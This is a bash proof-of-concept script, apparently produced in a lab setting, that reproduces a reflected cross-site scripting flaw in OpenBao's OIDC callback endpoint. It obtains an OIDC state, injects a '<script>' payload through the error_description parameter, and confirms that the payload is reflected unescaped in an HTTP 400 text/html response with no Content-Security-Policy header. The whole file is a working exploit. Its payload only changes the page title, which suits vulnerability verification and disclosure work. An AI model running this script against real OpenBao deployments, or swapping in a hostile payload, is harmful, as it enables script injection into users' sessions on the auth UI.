#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${OPENBAO_ADDR:-http://127.0.0.1:8200}"
TOKEN="${OPENBAO_TOKEN:-root}"
AUTH_PATH="oidc"
ROLE="lab-direct"
REDIRECT_URI="http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback"
EVIDENCE_ROOT="/home/playground/output/attempt_1/evidence"
RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-$$"
EVIDENCE_DIR="${EVIDENCE_ROOT}/${RUN_ID}"

mkdir -p "$EVIDENCE_DIR"

fail() {
  printf 'FAIL: %s\n' "$1" >&2
  printf 'Evidence: %s\n' "$EVIDENCE_DIR" >&2
  exit 1
}

health_status="$(curl -sS -o "$EVIDENCE_DIR/health.response.raw" \
  -D "$EVIDENCE_DIR/health.response.headers" \
  -w '%{http_code}' "$BASE_URL/v1/sys/health" || true)"
[ "$health_status" = 200 ] || fail "OpenBao health endpoint unavailable (HTTP ${health_status:-no response})"

auth_url_request() {
  local nonce="$1"
  local name="$2"
  local request="$EVIDENCE_DIR/${name}.request.json"
  local headers="$EVIDENCE_DIR/${name}.response.headers"
  local body="$EVIDENCE_DIR/${name}.response.raw"
  local status

  jq -n \
    --arg role "$ROLE" \
    --arg redirect_uri "$REDIRECT_URI" \
    --arg client_nonce "$nonce" \
    '{role: $role, redirect_uri: $redirect_uri, client_nonce: $client_nonce}' \
    > "$request"

  status="$(curl -sS -X POST \
    -H "X-Vault-Token: $TOKEN" \
    -H 'Content-Type: application/json' \
    --data-binary "@$request" \
    -D "$headers" -o "$body" -w '%{http_code}' \
    "$BASE_URL/v1/auth/$AUTH_PATH/oidc/auth_url" || true)"
  [ "$status" = 200 ] || fail "$name failed (HTTP ${status:-no response})"

  jq -e '.data.auth_url and (.data.state | type == "string" and length > 0)' "$body" >/dev/null \
    || fail "$name did not return a usable OIDC state"
  jq -r '.data.state' "$body"
}

callback_request() {
  local state="$1"
  local description="$2"
  local name="$3"
  local request_url="$EVIDENCE_DIR/${name}.request.url"
  local headers="$EVIDENCE_DIR/${name}.response.headers"
  local body="$EVIDENCE_DIR/${name}.response.raw"
  local meta="$EVIDENCE_DIR/${name}.curl.meta"
  local status

  curl -sS -G \
    --data-urlencode "state=$state" \
    --data-urlencode "error_description=$description" \
    -D "$headers" -o "$body" -w '%{http_code}\n%{url_effective}' \
    "$BASE_URL/v1/auth/$AUTH_PATH/oidc/callback" \
    > "$meta" || true

  # The first line is the HTTP status; the second is the exact encoded URL.
  # curl's final write-out is kept as the request artifact below.
  status="$(sed -n '1p' "$meta")"
  sed -n '2p' "$meta" > "$request_url"
  printf '%s\n' "$status" > "$EVIDENCE_DIR/${name}.status"
}

control_state="$(auth_url_request 'lab-control-nonce-7f' 'control-auth-url')"
control_marker='CONTROL-MARKER-OPENBAO-XSS-7F'
callback_request "$control_state" "$control_marker" 'control-callback'

control_status="$(sed -n '1p' "$EVIDENCE_DIR/control-callback.status")"
[ "$control_status" = 400 ] || fail "control callback did not return HTTP 400"
grep -Fq "$control_marker" "$EVIDENCE_DIR/control-callback.response.raw" \
  || fail "control marker was not reflected; callback path is not confirmed"

xss_state="$(auth_url_request 'lab-xss-nonce-7f' 'xss-auth-url')"
xss_marker="</p><script>document.title='OPENBAO-LAB-XSS-7F'</script><p>"
callback_request "$xss_state" "$xss_marker" 'xss-callback'

xss_status="$(sed -n '1p' "$EVIDENCE_DIR/xss-callback.status")"
[ "$xss_status" = 400 ] || fail "XSS callback did not return HTTP 400"
grep -Fq 'Content-Type: text/html' "$EVIDENCE_DIR/xss-callback.response.headers" \
  || fail "XSS callback was not returned as text/html"
grep -Fqi 'Content-Security-Policy:' "$EVIDENCE_DIR/xss-callback.response.headers" \
  && fail "XSS callback unexpectedly supplied a CSP header"
grep -Fq "$xss_marker" "$EVIDENCE_DIR/xss-callback.response.raw" \
  || fail "exact unescaped script marker was not reflected in the response body"

printf 'PASS: reflected OIDC callback XSS reproduced through the public API\n'
printf 'Evidence: %s\n' "$EVIDENCE_DIR"
